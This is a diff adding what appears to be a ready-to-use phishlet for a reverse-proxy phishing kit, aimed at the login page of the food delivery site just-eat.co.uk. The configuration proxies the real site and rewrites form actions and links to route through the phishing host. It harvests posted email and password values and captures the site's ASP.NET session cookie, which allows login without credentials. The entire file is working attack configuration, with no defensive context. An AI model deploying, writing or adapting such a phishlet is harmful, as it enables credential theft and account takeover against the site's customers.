@@ -1,0 +1,24 @@
+name: 'justeat' 
+author: '@zak_hax' 
+min_ver: '2.3.0' 
+proxy_hosts: 
+ - {phish_sub: 'www', orig_sub: 'www', domain: 'just-eat.co.uk', session: true, is_landing: true} 
+sub_filters: 
+ - {triggers_on: 'www.just-eat.co.uk', orig_sub: 'www', domain: 'just-eat.co.uk', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']} 
+ - {triggers_on: 'www.just-eat.co.uk', orig_sub: 'www', domain: 'just-eat.co.uk', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']} 
+ - {triggers_on: 'www.just-eat.co.uk', orig_sub: 'www', domain: 'just-eat.co.uk', search: '//{hostname}/ex/', replace: '//{hostname}/account/', mimes: ['text/html', 'application/json']}  
+auth_tokens: 
+ - domain: '.just-eat.co.uk' 
+   keys: ['.AspNet.ApplicationCookie'] 
+credentials:
+ username: 
+  key: 'Email' 
+  search: '(.*)' 
+  type: 'post'
+ password: 
+  key: 'Password' 
+  search: '(.*)' 
+  type: 'post'
+login: 
+ domain: 'www.just-eat.co.uk'
+ path: '/account/'
